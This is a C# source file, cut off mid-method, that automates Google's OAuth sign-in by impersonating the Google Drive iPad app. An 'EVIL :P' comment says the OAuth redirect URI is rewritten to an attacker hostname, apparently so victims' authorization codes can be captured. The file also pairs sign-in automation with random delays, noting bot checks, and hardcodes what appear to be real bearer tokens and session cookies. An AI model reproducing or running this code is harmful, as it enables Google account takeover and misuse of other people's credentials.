using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Web;
using System.Net.Http;
using Newtonsoft.Json;
using System.Diagnostics;
using System.Net.Http.Headers;
using System.IO;
using CefSharp;
using CefSharp.WinForms;
using Newtonsoft.Json.Linq;
using CefSharp.Handler;
using System.Threading;
using System.Text.RegularExpressions;
using static Pet.RUIGoogle.GoogleRequestTransformer;
using static Pet.RUIGoogle.GoogleConstants;
using static Pet.RUIGoogle.Extender;

namespace Pet.RUIGoogle
{
    //public struct OAuthInfo
    //{
    //    public string RedirectUri;
    //}

    public struct AuthAdviceInfo
    {
        public string client_state, system_version, device_name, device_id, device_challenge_request, device_model;
    }
    public struct AccountLookupInfo
    {
        public string ESrequestUri, @as, auth_extension, code_challenge, country, username, sessionState, bgRequest, at, azt, @continue;
    }

    public struct GoogleAccountInfo
    {
        public string username, password;
    }

    public class OAuth2Negotiator
    {
        //Essential

        private HttpClient _httpClient = null;
        HttpClientInterceptorHandler interceptor = null;
        private CookieContainer container = null;
        public BaiterAuth baiter = null;

        static Random rand = new Random();
        static readonly string authAdviceUri = "https://oauthaccountmanager.googleapis.com/v1/authadvice";
        //insert a random 4-digit number
        static readonly string accountlookupUri = "https://accounts.google.com/_/lookup/accountlookup?hl=en&_reqid=1{0}&rt=j";
        static readonly string programmaticAuthUri = "https://accounts.google.com/programmatic_auth";
        static readonly string signinChallengeUrl = "https://accounts.google.com/signin/v2/challenge/pwd";
        //Misc
        //OAuthInfo info;
        AuthAdviceInfo aaInfo;
        GoogleAccountInfo gaInfo;
        private string _errorResult = null;
        ReusableAwaiter<KeyValuePair<object, bool>> reusableTCS = null;

        public static async Task<OAuth2Negotiator> Create(/*OAuthInfo info*/ AuthAdviceInfo aaInfo, GoogleAccountInfo gaInfo/*, ChromiumWebBrowser browser*/)
        {
            //this.info = info;
            //this.info.RedirectUri = info.RedirectUri.TrimEnd('/');

            //_listener = new HttpListener();
            //_listener.Prefixes.Add(info.RedirectUri + "/");
            //_listener.AuthenticationSchemes = AuthenticationSchemes.Anonymous;


            OAuth2Negotiator nego = new OAuth2Negotiator
            {
                aaInfo = aaInfo,
                gaInfo = gaInfo,

                reusableTCS = new ReusableAwaiter<KeyValuePair<object, bool>>(),
                baiter = await BaiterAuth.Create(gaInfo/*, browser*/)
            };
            nego.container = new CookieContainer();
            HttpClientHandler handler = new HttpClientHandler()
            {
                AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
                CookieContainer = nego.container,
                AllowAutoRedirect = true
            };
            //HttpClientHandler handler = new HttpClientHandler()
            //{
            //    AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate,
            //    CookieContainer = nego.container,
            //    AllowAutoRedirect = false,
            //    //UseCookies = false
            //};
            nego.interceptor = new HttpClientInterceptorHandler(handler);
            nego.interceptor.HttpClientIntercepted += (sender, e) =>
            {
                nego.reusableTCS.TrySetResult(new KeyValuePair<object, bool>(e.Request, e.isRequest));
            };

            nego._httpClient = new HttpClient(nego.interceptor) { Timeout = TimeSpan.FromMinutes(30) };

            return nego;
        }

        public static void InitializeBrowser()
        {
            CefSettings settings = new CefSettings();
            settings.WindowlessRenderingEnabled = false;
            settings.UserAgent = "Chrome";

            //Autoshutdown when closing
            CefSharpSettings.ShutdownOnExit = true;

            //Perform dependency check to make sure all relevant resources are in our     output directory.
            Cef.Initialize(settings, performDependencyCheck: true, browserProcessHandler: null);
        }

        public async void OAuth(string authCode, string code_verifier)
        {
            //_httpClient.DefaultRequestHeaders.Add("Content-Type", "application/x-www-form-urlencoded");
            //_httpClient.DefaultRequestHeaders.Connection.Add("Keep-Alive");
            _httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(@"*/*"));
            _httpClient.DefaultRequestHeaders.Add("User-Agent", @"com.google.Drive/4.2021.22202 iSL/3.3 iPad/12.4.7 hw/iPad4_4 (gzip)");
            var content = "client_id=936475272427.apps.googleusercontent.com&code=" + authCode + "&code_verifier=" + code_verifier + "&grant_type=authorization_code&redirect_uri=com.google.sso.640853332981%3A%2FauthCallback%3Flogin%3Dcode&scope=https%3A%2F%2Fwww.google.com%2Faccounts%2FOAuthLogin";
            var response = new HttpResponseMessage
            {
                Content = new StringContent(content)
            };
            response.Content.Headers.Add(@"Content-Length", content.Length.ToString());
            var strContent = new StringContent(content);
            strContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded");
            _httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-us");
            _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "br, gzip, deflate");

            string uri = "https://www.googleapis.com/oauth2/v4/token";

            var clientRes = await _httpClient.PostAsync(uri, strContent);

            Debug.WriteLine((int)clientRes.StatusCode);
        }
        public async Task<Tuple<string, string, HttpResponseMessage>> AuthAdvice()
        {
            //_httpClient.DefaultRequestHeaders.Add("Content-Type", "application/x-www-form-urlencoded");
            //_httpClient.DefaultRequestHeaders.Connection.Add("Keep-Alive");
            //_httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(@"*/*"));
            //_httpClient.DefaultRequestHeaders.Add("User-Agent", @"com.google.Drive/4.2021.22202 iSL/3.3 iPad/12.4.7 hw/iPad4_4 (gzip)");
            //var content = "{\"client_state\":\"" + aaInfo.client_state +
            //    "\",\"external_browser\":\"true\",\"report_user_id\":\"true\"," +
            //    "\"system_version\":\"" + aaInfo.system_version +
            //    "\",\"app_version\":\"" + aaInfo.app_version + "\",\"user_id\":[]," +
            //    "\"safari_authentication_session\":\"true\",\"supported_service\":[\"uca\"]," +
            //    "\"request_trigger\":\"ADD_ACCOUNT\",\"lib_ver\":\"3.3\"," +
            //    "\"package_name\":\"com.google.Drive\"," +
            //    "\"redirect_uri\":\"com.google.sso.640853332981:\\/authCallback\"," +
            //    "\"device_name\":\"" + aaInfo.device_name + "\"," +
            //    "\"client_id\":\"640853332981.apps.googleusercontent.com\"," +
            //    "\"mediator_client_id\":\"936475272427.apps.googleusercontent.com\"," +
            //    "\"device_id\":\"" + aaInfo.device_id + "\",\"hl\":\"en-US\"," +
            //    "\"device_challenge_request\":\"" + aaInfo.device_challenge_request + "\"" +
            //    ",\"device_model\":\"" + aaInfo.device_model + "\"}";
            var content = CreateAuthAdviceContent(aaInfo);
            LTRequest authAdviceMock = new LTRequest()
            {
                Method = "POST",
                Url = authAdviceUri,
                ReferrerPolicy = ReferrerPolicy.NoReferrer
            };
            authAdviceMock.PostData = new PostData_();
            authAdviceMock.PostData.Elements = new List<PostDataElement_>();
            authAdviceMock.PostData.Elements.Add(new PostDataElement_() 
            {
                Bytes = Encoding.UTF8.GetBytes(content)
            });
            /* TODO: Fix this systematically. Due to UpdateHeaderTemplate's behavior of skipping
                         * updates on header values in the original request, Content-Type is set to be "text/plain; charset=utf-8"
                        */
            authAdviceMock.Headers.Add("Content-Type", "application/json");
            HttpRequestMessage authAdviceRequest = LTRequest.ReplicateRequest(authAdviceMock);
            HttpRequestMessageCrafter.UpdateHeaderTemplate(authAdviceRequest, authAdviceTemplate);
            var clientRes = await _httpClient.SendAsync(authAdviceRequest);
            //var response = new HttpResponseMessage
            //{
            //    Content = new StringContent(content)
            //};
            //response.Content.Headers.Add(@"Content-Length", content.Length.ToString());
            //var strContent = new StringContent(content);
            //strContent.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
            //_httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-us");
            //_httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "br, gzip, deflate");

            //var clientRes = await _httpClient.PostAsync(authAdviceUri, strContent);

            string resContent = await clientRes.Content.ReadAsStringAsync();

            //CustomCefResponse interject = new CustomCefResponse()
            //{
            //    charset = clientRes.Content.GetCharSet(),
            //    @continue = true,
            //    data = await clientRes.Content.ReadAsByteArrayAsync(),
            //    exact = true,
            //    mimeType = "application/json",
            //    url = authAdviceRequest.RequestUri.AbsoluteUri
            //};
            //Debug.WriteLine("HERE COMES THE BOI");
            //Debug.WriteLine(resContent);

            JObject o = JObject.Parse(resContent);

            Debug.WriteLine((int)clientRes.StatusCode);

            /*
             * EVIL :P
             * Normally, the redirect url is: com.google.sso.XXX:/authCallBack
             * The modified redirect url is: //com.google.sso.YYY:443/authCallBack, where YYY is
             * the evil hostname (i.e. petterpet.tk)
             */
            return new Tuple<string, string, HttpResponseMessage>((string)o["code_verifier"],
                ((string)o["uri"]).Replace("com.google.sso.", @""), clientRes);
        }
        public async Task<Tuple<string[], HttpResponseMessage>> EmbeddedSetup(string uri, string cookies)
        {
            LTRequest ESMock = new LTRequest()
            {
                Method = "GET",
                Url = uri,
                ReferrerPolicy = ReferrerPolicy.NoReferrer
            };

            HttpRequestMessage ESRequest = LTRequest.ReplicateRequest(ESMock);
            HttpRequestMessageCrafter.UpdateHeaderTemplate(ESRequest, embeddedSetupTemplate);

            ESRequest.Headers.Add("Cookie", cookies);

            var clientRes = await _httpClient.SendAsyncWithCookie(container, ESRequest);
            string resContent = await clientRes.Content.ReadAsStringAsync();

            //Debug.WriteLine(resContent);
            //CustomCefResponse interject = new CustomCefResponse()
            //{
            //    charset = clientRes.Content.GetCharSet(),
            //    @continue = true,
            //    data = await clientRes.Content.ReadAsByteArrayAsync(),
            //    exact = true,
            //    mimeType = "text/html",
            //    url = ESRequest.RequestUri.AbsoluteUri
            //};

            //JObject o = JObject.Parse(resContent);

            Debug.WriteLine((int)clientRes.StatusCode);

            //Debug.Write(o["OewCAd"]);
            return new Tuple<string[], HttpResponseMessage>(PrepareAccountLookupValues(resContent),
                clientRes);
        }
            
        public async void AccountLookup(AuthAdviceInfo aa, AccountLookupInfo al)
        {
            string referer = CreateAccountLookupReferer(al.ESrequestUri);
            
            LTRequest ALMock = new LTRequest()
            {
                Method = "POST",
                Url = string.Format(accountlookupUri, rand.Next(2000, 5000)),
                ReferrerPolicy = ReferrerPolicy.Default,
                ReferrerUrl = referer
            };

            ALMock.PostData = new PostData_();
            ALMock.PostData.Elements = new List<PostDataElement_>();
            ALMock.PostData.Elements.Add(new PostDataElement_() 
            {
                //Bytes = 
            });

            HttpRequestMessage ESRequest = LTRequest.ReplicateRequest(ALMock);
            HttpRequestMessageCrafter.UpdateHeaderTemplate(ESRequest, authAdviceTemplate);

            var clientRes = await _httpClient.SendAsync(ESRequest);
            string resContent = await clientRes.Content.ReadAsStringAsync();
            //JObject o = JObject.Parse(resContent);

            Debug.WriteLine((int)clientRes.StatusCode);

            //Debug.Write(o["OewCAd"]);
            string acContent;
        }
        public async Task<string> AccountLookup(HttpRequestMessage message)
        {
            message.Headers.ExpectContinue = false;
            var clientRes = await _httpClient.SendAsync(message);
            string resContent = await clientRes.Content.ReadAsStringAsync();
            //JObject o = JObject.Parse(resContent);

            Debug.WriteLine((int)clientRes.StatusCode);
            Debug.WriteLine(resContent);

            //List<List<List<List<object>>>> array = JsonConvert.DeserializeObject<List<List<List<List<object>>>>>(resContent);
            //return (string)array[0][0][1][2];

            string TLStart = ",[]],[\"gf.ttu\",0,\"";
            string TLEnd = "\"]";

            string TL = resContent.Substring(resContent.IndexOf(TLStart) + TLStart.Length);
            TL = TL.Remove(TL.IndexOf(TLEnd));

            return TL;
            //string acContent;
        }

        public async void ProgrammaticAuth(AuthAdviceInfo aa, string uri, string @as, string code_challenge,
            string auth_extension, string TL)
        {
            //string uri = programmaticAuthUri + CreateProgrammaticAuthQuery(part);
            string referer = signinChallengeUrl + CreateProgrammaticAuthReferer(aa, @as, code_challenge, auth_extension, TL);

            LTRequest PAMock = new LTRequest()
            {
                Method = "GET",
                Url = uri,
                ReferrerPolicy = ReferrerPolicy.Default,
                ReferrerUrl = referer
            };

            HttpRequestMessage PARequest = LTRequest.ReplicateRequest(PAMock);
            HttpRequestMessageCrafter.UpdateHeaderTemplate(PARequest, programmaticauthTemplate);

            var clientRes = await _httpClient.SendAsync(PARequest);
            string resContent = await clientRes.Content.ReadAsStringAsync();
            //JObject o = JObject.Parse(resContent);

            Debug.WriteLine((int)clientRes.StatusCode);
            Debug.WriteLine(resContent);

            //Debug.Write(o["OewCAd"]);
            //string acContent;
        }

        //private async void UpdateCookie(HttpRequestMessage message)
        //{
        //    foreach (string cookie in message.Headers.GetValues("Cookie"))
        //    {
        //        int index = cookie.IndexOf('=');
        //        Debug.WriteLine($"Name {cookie.Remove(index)}");
        //        Debug.WriteLine($"Value {cookie.Remove(0, index + 1)}");

        //        container.Add(new System.Net.Cookie(cookie.Remove(index), cookie.Remove(0, index + 1)) { Domain = message.RequestUri.Host });
        //    }
        //}

        public async void Login(string email, string cookies)
        {
            
            //Successful signin automation code. Commented out because of bot checks
            #region Signin Automation
            //if (email.Contains("@"))
            //    email = email.Remove(email.IndexOf("@"));

            //HttpRequestMessage accountlookupRequest = await baiter.GetAccountLookupRequest(gaInfo.username);

            //HttpResponseMessage accountlookupResponse = await _httpClient.SendAsyncWithCookie(container, accountlookupRequest);

            //string referer = accountlookupResponse.RequestMessage.RequestUri.AbsoluteUri;
            //string html = await accountlookupResponse.Content.ReadAsStringAsync();
            //string[] contentValues = prepareValues(html, gaInfo);

            //LTRequest request = new LTRequest()
            //{
            //    Method = "POST",
            //    ReferrerUrl = referer,
            //    Url = signinUri,
            //    ReferrerPolicy = ReferrerPolicy.Origin,
            //};
            //request.PostData = new PostData_();
            //request.PostData.Elements = new List<PostDataElement_>();
            //request.PostData.Elements.Add(new PostDataElement_()
            //{
            //    Bytes = Encoding.UTF8.GetBytes(string.Format(signinContent, contentValues))
            //});

            ///* TODO: Fix this systematically. Due to UpdateHeaderTemplate's behavior of skipping
            // * updates on header values in the original request, Content-Type is set to be "text/plain; charset=utf-8"
            //*/
            //request.Headers["Content-Type"] = "application/x-www-form-urlencoded";

            //HttpRequestMessage sendback = LTRequest.ReplicateRequest(request);
            //HttpRequestMessageCrafter.UpdateHeaderTemplate(sendback, signinHeaderTemplate);

            //string cookieVal = "";
            //foreach (System.Net.Cookie cookie in container.GetCookies(sendback.RequestUri))
            //    cookieVal += $"{cookie.Name}={cookie.Value}; ";
            //cookieVal = cookieVal.Remove(cookieVal.Length - 2);
            //request.Headers.Add("Cookie", cookieVal);

            //await _httpClient.SendAsync(sendback);
            #endregion

            //string bgRequest = await baiter.GetBgRequest(email);
            Tuple<string, string, HttpResponseMessage> authAdvice = await AuthAdvice();
            Debug.WriteLine(authAdvice.Item1);

            //TODO: Add cookies
            await Task.Delay(rand.Next(4000, 6000));
            Tuple<string[], HttpResponseMessage> embeddedSetup = await EmbeddedSetup(authAdvice.Item2, cookies);
            
            Uri uri = new Uri(authAdvice.Item2);
            NameValueCollection ESUriQuery = HttpUtility.ParseQueryString(uri.Query);


            //string urlEncodedES = uri.GetLeftPart(UriPartial.Path) + QueryConvert.ToQueryString(ESUriQuery);
            //ESUriQuery = HttpUtility.ParseQueryString(new Uri(urlEncodedES).Query);
            //CreateAccountLookupFReq(aaInfo, "muahanglazada231", embeddedSetup[1], "VN", urlEncodedES,
            //    ESUriQuery.Get("auth_extension"), ESUriQuery.Get("code_challenge"));
            //AccountLookupInfo alInfo = new AccountLookupInfo()
            //{
            //    @as = ESUriQuery.Get("as"),
            //    auth_extension = ESUriQuery.Get("auth_extension"),
            //    code_challenge = ESUriQuery.Get("code_challenge"),
            //    @continue = embeddedSetup[0],
            //    username = "muahanglazada231",
            //    sessionState = embeddedSetup[1],
            //    at = embeddedSetup[2],
            //    azt = embeddedSetup[3],
            //    ESrequestUri = embeddedSetup[4],
            //    bgRequest = "<M_9q_7ICAAZ_dfp3X3WN5ZRYzJFaUZH0ACkAIwj8Ru3zlys9wRkcQuCNrpoHyLzaau-8R7BxhiYYj7SbSMFmJQZ6gc0AAAWQnQAAAEinAQdWAwi0pKnsasIr5rQJ-rwmKneh5YaSe1Nwf8WOt7VadcR4ktafI4SH2mFqSS8DhD0dFF2twsoFxrpJ40HKXg84hvfxg6NakqZsRBTlrTO8kvvUDye35-fW9rQmnV5-8npuN22817SwGxY3Ao5Kve3Z2SVReE7rQ8R9WyPB5H7nvsFJ3N4i2z1-Xn1_rm4bRd4q6zNmYBwfnIg1d-TOP2blCuK-EJEFrc0FdRpGPVmGTkT9xIMRft1qvwjSEbMxFLJUMMW3Utb7vcE3XJ-ZhXamzdDmyQB5QUkiCs9H5bUnsEQndWUlIKdHp0tn8SRd3ZLxRcfEZZ6MH3G2Y-SyEvAY8vRLNDSmGs9p7pK4j_3b2VxTtH2ACU4t2XywvZg8f8CfzNZjcBUOFI_Ryq0jg_dF4AhfGePPDK3mBk5Ju1gNSOVQ9-J8QGLeQxgvkAzrsakvxnpBSaWGJW9nbrv5jZtI_Wdb-e_WP8ayDzOIcE0yjott60yicLvV49mikl-fuox4YJ1npfZE8x-UcI5yaNK8Ig7z1xz8vFmHag9P0jZKy6BvgWXkt-d-pr7EIGMV93pyyW4jUGrhtBCKrvVYkfGvwjJtVsI5lsRVugPX7_bBWAG27bc7spBG31ACvSAtkFCVLpKSJZo7zP4-5eb-Kywl0-nhTCRLpQJviJxEeAe0KeEYtLCNprMISb7wgXVxWzBoeob54djKBGapC3VdTJgTCdzrde7txnK141SuvA3GcEoNPPIH2MDGHIrvC3DFY7gty_RoNovO2zSe7x3TXmW4TGxv03pzXYFzcDfa8patyqdBkVLmIoKmSCgT_ynO-9gtS3PK-JuQHM6v8hLXff1Q6KspnROcOugALqflFkqe_XOZ1FZ8gPRIM8hYEbq5thtW4ielkFg9Kc0O6jaWiF6VRUYEKiYSbpXSjVmYMqXzX59bHmE_kLW8ns2bh9hWYZ_0ZxYW3S78B4I0g3uumpdZnGBxUjGwugbPvgcEND3wFp1z9lbjFhVtGZAu0ZDVNMxtiS9NOVLLpa3kSw",
            //    country = "VN"
            //};
            //Debug.WriteLine(CreateAccountLookupContent(aaInfo, alInfo));

            HttpRequestMessage accountlookupReq = await 
                baiter.GetAccountLookupRequest(email, authAdvice.Item3, embeddedSetup.Item2);

            Debug.WriteLine("ACCOUNTLOOKUP CONTENT: " + await accountlookupReq.Content.ReadAsStringAsync());

            await Task.Delay(rand.Next(3000, 5000));
            string TL = await AccountLookup(accountlookupReq);
            Debug.WriteLine(TL);

            //NameValueCollection PAUriQuery = HttpUtility.ParseQueryString(embeddedSetup.Item1[0]);
            await Task.Delay(rand.Next(4000, 6000));
            Debug.WriteLine("PROGRAMMATIC AUTH: " + embeddedSetup.Item1[0]);
            ProgrammaticAuth(aaInfo, embeddedSetup.Item1[0] + "&authuser=0", ESUriQuery.Get("as"),
                ESUriQuery.Get("code_challenge"), ESUriQuery.Get("auth_extension"), TL);

            Debug.WriteLine(authAdvice.Item2);
            //Debug.WriteLine(acContent);
        }

        private async Task<string> RetrieveAuthKey(HttpListener listener)
        {
            var context = await listener.GetContextAsync();
            var query = context.Request.QueryString;
            if (context.Request.Url.ToString().EndsWith("favicon.ico"))
            {
                context.Response.StatusCode = (int)HttpStatusCode.NotFound;
                context.Response.Close();
            }
            else if (query != null && query.Count > 0)
            {
                if (!string.IsNullOrEmpty(query["code"]))
                    return query["code"];
                //_accessToken = await SendCodeAsync(query["code"]);
                else if (!string.IsNullOrEmpty(query["error"]))
                {
                    _errorResult = string.Format("{0}: {1}", query["error"], query["error_description"]);
                }
            }
            return "";
        }

        //public async Task<GoogleAuthModel> RetrieveAuthModel()
        //{
        //    string authCode = await RetrieveAuthKey();
        //    Debug.WriteLine(authCode);

        //    var accessTokenUrlContent = GenerateTokenUriContent(authCode);
        //    GoogleAuthModel model = await RetrieveAuthModel(accessTokenUrlContent);
        //    CheckError();
        //    Debug.WriteLine(model.access_token);

        //    return model;
        //}

        //private async Task<GoogleAuthModel> RetrieveAuthModel(string content)
        //{
        //    using (var request = new HttpRequestMessage(new HttpMethod("POST"), info.TokenUri))
        //    {
        //        request.Content = new StringContent(content);
        //        request.Content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded");

        //        var response = await _httpClient.SendAsync(request);
        //        var responseData = await response.Content.ReadAsStringAsync();

        //        if (response.StatusCode == HttpStatusCode.OK)
        //        {
        //            var responseToken = JsonConvert.DeserializeObject<GoogleAuthModel>(responseData);
        //            if (responseToken.refresh_token != null)
        //            {
        //                return responseToken;
        //            }
        //            else
        //                return null;
        //        }
        //        else
        //        {
        //            _errorResult = HttpWorkerRequest.GetStatusDescription((int)response.StatusCode);
        //            return null;
        //        }
        //    }
        //}

        public async void Download(string token, string fileID, string outputPath)
        {
            //using (var request = new HttpRequestMessage(new HttpMethod("POST"), "https://www.googleapis.com/download/drive/v2internal/files/1YLrYhvAcT7Nnpbgv1IkDGEdRfjlccKF7?&alt=media"))
            //{
            //request.Content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/x-www-form-urlencoded");
            _httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
            _httpClient.DefaultRequestHeaders.Add("User-Agent", UserAgent.Value);
            //_httpClient.DefaultRequestHeaders.Add("Cookie", @"NID=511=qwZ4F_DKEwG7XS56oN4zNQVfy52fVFp1UMSf0xmEjcVH2-t_adH9JlWm3E2_hFq-0cAnI_cdOOZzBSEgEbx9l-AWrDIyHVUwDIJ7UbJQALD_syywsosurt_l6-iHU5HN2WR3bXUxwa79cCGYRBxKyCOLj3KnQBAKd9_s7_eG0jg");

            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "ya29.A0ARrdaM_2iq2uDxK1QTy5mjHzwKRHHLfUML_-wi-C00Jtl8z65CsEMzcOBUS0hmMn48nbxIYQcpg77eQ0KS-VD8_Jltyyed46gfZc-wsntf4dO8-WPcxTYy005Ozwux24bRjSyZpQwhXIINnjbyAy0cUh3tZh9Lw7CubWdh-C0Jqf4uYy57AlMfOohmD_QZHFC8XhAj5KLzdidl5M7mRFgbOiC99_B_U09GyByewEeJDqjGMlRhuEHd12gslx2t8WKUK0-jnhSK3wJaG-jqsY3RPFpid-ru_ogu4jYA47KKINi4UtZxr0-B3hgbZkHYPxoFI");
            _httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(@"*/*"));
            _httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-us");
            _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip");

            string uri = string.Format("https://www.googleapis.com/download/drive/v2internal/files/{0}?&alt=media", fileID);

            using (var s = await _httpClient.GetStreamAsync(uri))
            {
                using (var fs = new FileStream(outputPath, FileMode.Create))
                {
                    await s.CopyToAsync(fs);
                    fs.SetLength(fs.Position);
                }
            }

            Debug.WriteLine("DONE");

            //}
        }
        public async void Star()
        {
            //using (var request = new HttpRequestMessage(new HttpMethod("PUT"), "https://www.googleapis.com/drive/v2/files/10zV9C93N_ulPMWYt8NDr1xjkN31KKdMf?enforceSingleParent=true&errorRecovery=false&languageCode=en&modifiedDateBehavior=DRIVE_UI_OFFLINE&openDrive=false&reason=912&supportsAllDrives=true&syncType=2&updateViewedDate=false&fields=kind%2Cparents%2Fid%2Ctitle%2CmimeType%2Clabels%2Fstarred%2Clabels%2Ftrashed%2Clabels%2Frestricted%2CcreatedDate%2CmodifiedDate%2CmodifiedByMeDate%2ClastViewedByMeDate%2CfileSize%2CalternateLink%2Cid%2Cshared%2CsharedWithMeDate%2CexplicitlyTrashed%2CquotaBytesUsed%2Ccapabilities%2FcanCopy%2Csubscribed%2CfolderColor%2Ccapabilities%2FcanDownload%2CprimarySyncParentId%2CfolderFeatures%2Cetag%2CexportLinks%2Cspaces%2CownedByMe%2Ccapabilities%2FcanEdit%2Ccapabilities%2FcanComment%2Crecency%2CrecencyReason%2Cversion%2CactionItems%2Ccapabilities%2FcanAddChildren%2Ccapabilities%2FcanDelete%2Ccapabilities%2FcanRemoveChildren%2Ccapabilities%2FcanShare%2Ccapabilities%2FcanTrash%2Ccapabilities%2FcanManageMembers%2Ccapabilities%2FcanManageVisitors%2CdriveId%2Ccapabilities%2FcanRename%2ChasAugmentedPermissions%2Ccapabilities%2FcanReadDrive%2Ccapabilities%2FcanMoveTeamDriveItem%2CprimaryDomainName%2CorganizationDisplayName%2CpassivelySubscribed%2CtrashedDate%2Ccapabilities%2FcanShareAsCommenter%2Ccapabilities%2FcanShareAsFileOrganizer%2Ccapabilities%2FcanShareAsOrganizer%2Ccapabilities%2FcanShareAsReader%2Ccapabilities%2FcanShareAsWriter%2Ccapabilities%2FcanShareAsOwner%2Ccapabilities%2FcanSharePublishedViewAsReader%2ChasVisitorPermissions%2Ccapabilities%2FcanMoveItemOutOfDrive%2CpairedDocType%2Cdetectors%2CblockingDetectors%2CwarningDetectors%2Ccapabilities%2FcanModifyContentRestriction%2CcontentRestrictions%2FreadOnly%2CcontentRestrictions%2Freason%2Ccapabilities%2FcanShareToAllUsers%2CworkspaceIds%2Cproperties%2Ccapabilities%2FcanModifyContent%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanMoveChildrenOutOfDrive%2Ccapabilities%2FcanDeleteChildren%2Ccapabilities%2FcanTrashChildren%2Ccapabilities%2FcanRequestApproval%2CapprovalMetadata%2FapprovalVersion%2Ccapabilities%2FcanReadCategoryMetadata%2CthumbnailVersion%2CshortcutDetails%2FtargetId%2CshortcutDetails%2FtargetMimeType%2CshortcutDetails%2FtargetLookupStatus%2CshortcutDetails%2FtargetFile%2CpermissionsSummary%28visibility%28type%29%29%2CpermissionsSummary%28visibility%28withLink%29%29%2Cowners%2Fid%2ClastModifyingUser%2Fid%2CsharingUser%2Fid%2Ccapabilities%2FcanAddMyDriveParent%2CcustomerId%2CancestorHasAugmentedPermissions%2Ccapabilities%2FcanShareChildFiles%2Ccapabilities%2FcanShareChildFolders%2Cowners%2FemailAddressFromAccount%2ClastModifyingUser%2FemailAddressFromAccount%2CsharingUser%2FemailAddressFromAccount%2Ccapabilities%2FcanMoveItemWithinDrive%2Ccapabilities%2FcanMoveItemOutOfDrive%2Ccapabilities%2FcanMoveChildrenWithinDrive%2Ccapabilities%2FcanAddFolderFromAnotherDrive%2CresourceKey%2CshortcutDetails%2FtargetResourceKey%2Ccapabilities%2FcanBlockOwner%2CcontainsUnsubscribedChildren"))
            //{
            var content = new StringContent("{\"labels\":{\"starred\":false}}");
            content.Headers.ContentType = MediaTypeHeaderValue.Parse("application/json");
            _httpClient.DefaultRequestHeaders.Accept.Add(new MediaTypeWithQualityHeaderValue(@"*/*"));
            //_httpClient.DefaultRequestHeaders.Add("Connection", "keep-alive");
            _httpClient.DefaultRequestHeaders.Add("Accept-Language", "en-us");
            //_httpClient.DefaultRequestHeaders.Add("Cookie", "NID=511=t125jVRq1M-tS6URRaRgnZc2HI4a8x_PVYFuoDIMlvs4mGluDq9lIzIoLcJZ5N5hb4u5SczBkf0zz7Qlz6_toEV__uVXMj69ZgWZ5JiBkQKTowDYDiw0SkMyYjUr6zk7NXfqsrBQrSxLKjUdflf4pwU5DVgbmbiImag7QIFHOlY");
            _httpClient.DefaultRequestHeaders.Authorization = new AuthenticationHeaderValue("Bearer", "ya29.A0ARrdaM_OYqHzdVh6YEVJ9G2ZWJRDa4g2NZch0uvyCSFqhpnEO7IDZkVJ8h8uHS-bLrG59T1O8v7UtlhgI73jsNSrR-osHPdswbb4U6At6UzfpaEgWNOXVaSUwkNu0mTxA4l4xltSXeiK420SiNB_wYLFCnSSFoOloquZIF1R-as-cM8-bxT6RJrvWpfms94cVe6N1tnHpgF1Qpo2Oz4d2D8bGGSkSyVhwROGq8PmnlG9c7LNs2pT70M95XMBvl864X5AI-vzC5PyOgQ7nps3FJ5XwyMGHHrqWhFLZwpWhbzYo5mfwluoI9vmUXqHfPxf3GI");
            _httpClient.DefaultRequestHeaders.Add("User-Agent", @"com.google.Drive/4.2021.22202 iPad/12.4.7 hw/iPad4_4");
            //_httpClient.DefaultRequestHeaders.Add("Cookie", @"NID=511=qwZ4F_DKEwG7XS56oN4zNQVfy52fVFp1UMSf0xmEjcVH2-t_adH9JlWm3E2_hFq-0cAnI_cdOOZzBSEgEbx9l-AWrDIyHVUwDIJ7UbJQALD_syywsosurt_l6-iHU5HN2WR3bXUxwa79cCGYRBxKyCOLj3KnQBAKd9_s7_eG0jg");
            _httpClient.DefaultRequestHeaders.IfMatch.Add(new EntityTagHeaderValue("\"1650470180000\""));
            //content.Headers.ContentLength = 28;
            _httpClient.DefaultRequestHeaders.Add("Accept-Encoding", "gzip");


